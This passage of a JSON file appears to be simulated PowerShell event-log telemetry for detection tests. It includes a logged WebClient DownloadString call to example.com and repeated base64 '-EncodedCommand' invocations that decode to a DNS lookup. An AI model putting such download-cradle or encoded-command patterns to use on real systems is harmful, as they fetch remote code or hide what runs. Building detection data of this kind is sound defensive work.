      "details": "$commandToRun = @'\n(New-Object System.Net.WebClient).DownloadString('http://example.com')\n'@\n$timeoutSeconds = 25\n$result = @{\n    Stdout = \"\"\n    Stderr = \"\"\n    ReturnCode = -1\n}\ntry {\n    $scriptBlock = [scriptblock]::Create($commandToRun)\n    $job = Start-Job -ScriptBlock $scriptBlock\n    if (Wait-Job -Job $job -Timeout $timeoutSeconds) {\n        $output = Receive-Job -Job $job\n        $result.Stdout = ($output | Out-String).Trim()\n        if ($job.State -eq 'Failed') {\n            $result.Stderr = $job.ChildJobs[0].JobStateInfo.Reason.Message\n            $result.ReturnCode = 1\n        } else {\n            $result.ReturnCode = 0\n        }\n    } else {\n        $result.Stderr = \"Command timed out on the server after $timeoutSeconds seconds.\"\n        $result.ReturnCode = 124\n    }\n} catch {\n    $result.Stderr = \"Wrapper Script Error: $($_.Exception.Message)\"\n    $result.ReturnCode = 1\n} finally {\n    if ($job) {\n        Stop-Job -Job $job -ErrorAction SilentlyContinue\n        Remove-Job -Job $job -ErrorAction SilentlyContinue -Force\n    }\n}\n$result | ConvertTo-Json -Compress"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40962,
      "details": "PowerShell console is ready for user input"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 53504,
      "details": "Windows PowerShell has started an IPC listening thread on process: 3112 in AppDomain: DefaultAppDomain."
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40961,
      "details": "PowerShell console is starting up"
    }
  ],
  "PS-052": [
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "$global:?"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFIAZQBzAG8AbAB2AGUALQBEAG4AcwBOAGEAbQBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUALgBjAG8AbQAgAC0AVAB5AHAAZQAgAEEACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFIAZQBzAG8AbAB2AGUALQBEAG4AcwBOAGEAbQBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUALgBjAG8AbQAgAC0AVAB5AHAAZQAgAEEACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFIAZQBzAG8AbAB2AGUALQBEAG4AcwBOAGEAbQBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUALgBjAG8AbQAgAC0AVAB5AHAAZQAgAEEACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFIAZQBzAG8AbAB2AGUALQBEAG4AcwBOAGEAbQBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUALgBjAG8AbQAgAC0AVAB5AHAAZQAgAEEACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFIAZQBzAG8AbAB2AGUALQBEAG4AcwBOAGEAbQBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUALgBjAG8AbQAgAC0AVAB5AHAAZQAgAEEACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
